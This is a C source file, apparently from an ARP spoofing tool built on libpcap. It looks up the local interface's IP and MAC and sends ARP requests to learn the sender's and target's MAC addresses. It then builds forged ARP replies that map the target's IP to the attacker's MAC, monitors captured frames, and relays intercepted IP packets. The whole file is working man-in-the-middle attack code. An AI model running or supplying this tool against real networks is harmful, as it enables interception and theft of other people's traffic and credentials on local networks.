#include "arp_spoof.h"



void get_ip_address (const char * dev, unsigned char * ip) {
    int sockfd;
    struct ifreq ifrq;
    struct sockaddr_in * sin;
    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    strcpy(ifrq.ifr_name, dev);
    if (ioctl(sockfd, SIOCGIFADDR, &ifrq) < 0) {
        perror( "ioctl() SIOCGIFADDR error");
    }
    sin = (struct sockaddr_in *)&ifrq.ifr_addr;
    memcpy (ip, (void*)&sin->sin_addr, sizeof(sin->sin_addr));

    close(sockfd);
}




void get_mac_address(char* dev, unsigned char *mac)
{
    #define HWADDR_len 6
    int s,i;
    struct ifreq ifr;
    s = socket(AF_INET, SOCK_DGRAM, 0);
    strcpy(ifr.ifr_name, dev);
    ioctl(s, SIOCGIFHWADDR, &ifr);
    for (i=0; i<HWADDR_len; i++)
         mac[i] = ((unsigned char*)ifr.ifr_hwaddr.sa_data)[i];
}


void str_ip2int_ip(char *str_ip, uint8_t *int_ip)
{
    char *ptr;
    ptr = strtok(str_ip,".");

    for(int i = 0; i < 4 ; i++)
    {
        int_ip[i] = (uint8_t)atoi(ptr);
        ptr = strtok(NULL, ".");
    }
}


void make_arp_request_packet_get_mac(uint8_t *attacker_mac, uint8_t *attacker_ip, uint8_t *sender_ip, uint8_t *packet)
{
    struct arp_packet *arp_request_packet;

    arp_request_packet = (struct arp_packet*)packet;

    for(int i = 0; i < 6; i++)
    {
        arp_request_packet->ethernet_packet.dst_mac[i] = 0xFF;
        arp_request_packet->ethernet_packet.src_mac[i] = attacker_mac[i];
        arp_request_packet->arp_packet.sender_HW_addr[i] = attacker_mac[i];
        arp_request_packet->arp_packet.target_HW_addr[i] = 0x00;
    }

    for(int i = 0; i < 4; i++)
    {
        arp_request_packet->arp_packet.sender_proto_addr[i] = attacker_ip[i];

        arp_request_packet->arp_packet.target_proto_addr[i] = sender_ip[i];

    }

    arp_request_packet->ethernet_packet.type = ntohs(0x0806);

    arp_request_packet->arp_packet.HW_type = ntohs(0x0001);
    arp_request_packet->arp_packet.HW_length = 0x06;
    arp_request_packet->arp_packet.proto_type = ntohs(0x0800);
    arp_request_packet->arp_packet.proto_length = 0x04;
    arp_request_packet->arp_packet.op = ntohs(0x0001);
}

void make_arp_reply_spoofed_packet_for_attack(uint8_t *attacker_mac, uint8_t * target_ip, uint8_t *sender_mac, uint8_t * sender_ip, uint8_t *packet)
{

    struct arp_packet *arp_reply_packet;

    arp_reply_packet = (struct arp_packet*)packet;

    for(int i = 0; i < 6; i++)
    {
        arp_reply_packet->ethernet_packet.dst_mac[i] = sender_mac[i];
        arp_reply_packet->ethernet_packet.src_mac[i] = attacker_mac[i];
        arp_reply_packet->arp_packet.sender_HW_addr[i] = attacker_mac[i];
        arp_reply_packet->arp_packet.target_HW_addr[i] = sender_mac[i];
    }

    for(int i = 0; i < 4; i++)
    {
        arp_reply_packet->arp_packet.sender_proto_addr[i] = target_ip[i];
        arp_reply_packet->arp_packet.target_proto_addr[i] = sender_ip[i];
    }

    arp_reply_packet->ethernet_packet.type = ntohs(0x0806);

    arp_reply_packet->arp_packet.HW_type = ntohs(0x0001);
    arp_reply_packet->arp_packet.HW_length = 0x06;
    arp_reply_packet->arp_packet.proto_type = ntohs(0x0800);
    arp_reply_packet->arp_packet.proto_length = 0x04;
    arp_reply_packet->arp_packet.op = ntohs(0x0002);
}

int monitoring_packet(uint8_t *sender_mac, uint8_t *attacker_mac, uint8_t *target_mac, const u_char *packet)
{
    struct ethernet *eth;
    eth = (struct ethernet*)packet;
    if(memcmp(&eth->type,"\x08\x00",2))
    {
        if(!memcmp(eth->src_mac, sender_mac, 6) && !memcmp(eth->dst_mac, target_mac, 6)) return 1;
    }

    if(memcmp(&eth->type,"\x08\x06",2))
    {
        if(!memcmp(eth->dst_mac, sender_mac, 6)) return 2;
    }

    return 0;
}

void pcap_relaypacket(pcap_t* handle, uint8_t* attacker_mac, uint8_t* target_mac_1, const u_char* packet)
{
    int packet_length;
    struct ip_packet *ippacket = (struct ip_packet*)packet;
    packet_length = ntohs(ippacket->ip_packet.total_length)+14;

    memcpy(ippacket->ethernet_packet.dst_mac, target_mac_1, 6);
    memcpy(ippacket->ethernet_packet.src_mac, attacker_mac, 6);

    pcap_sendpacket(handle, packet, packet_length);
}


int send_request_packet_for_get_mac(pcap_t* handle, char* dev, struct address_set *set, int id)
{
    if(id == SEND_REQUEST_MESSAGE_TO_GET_SENDER_MAC)
    {
        pcap_sendpacket(handle, set->request_packet_to_sender, 42);
    }
    else if(id == SEND_REQUEST_MESSAGE_TO_GET_TARGET_MAC)
    {
        pcap_sendpacket(handle, set->request_packet_to_target, 42);
    }else{ printf("ERROR :: pacp_sendpacket"); return -1;}

    char errbuf[PCAP_ERRBUF_SIZE];

    while (true)
    {
        struct arp_packet *get_packet;
        struct pcap_pkthdr* header;
        const u_char* captured_packet;

        int res = pcap_next_ex(handle, &header, &captured_packet);
        if (res == 0){printf("res == 0\n");continue;}
        if (res == -1 || res == -2) {printf("res == -1 || res == -2");break;}
        get_packet = (struct arp_packet *)captured_packet;

        if((get_packet->ethernet_packet.type == ntohs(0x0806)) && (get_packet->arp_packet.op == ntohs(0x0002)))
        {
            if(id == SEND_REQUEST_MESSAGE_TO_GET_SENDER_MAC)
            {
                if( memcmp(get_packet->arp_packet.sender_proto_addr, set->sender_ip, 4) == 0)
                {
                    for(int i = 0; i < 6; i++)
                        set->sender_mac[i] = get_packet->arp_packet.sender_HW_addr[i];
                    return SEND_REQUEST_MESSAGE_TO_GET_SENDER_MAC;
                }
            }else if(id == SEND_REQUEST_MESSAGE_TO_GET_TARGET_MAC)
            {
                if( memcmp(get_packet->arp_packet.sender_proto_addr, set->target_ip, 4) == 0)
                {
                    for(int i = 0; i < 6; i++)
                        set->target_mac[i] = get_packet->arp_packet.sender_HW_addr[i];
                    return SEND_REQUEST_MESSAGE_TO_GET_TARGET_MAC;
                }
            }
        }
    }
}
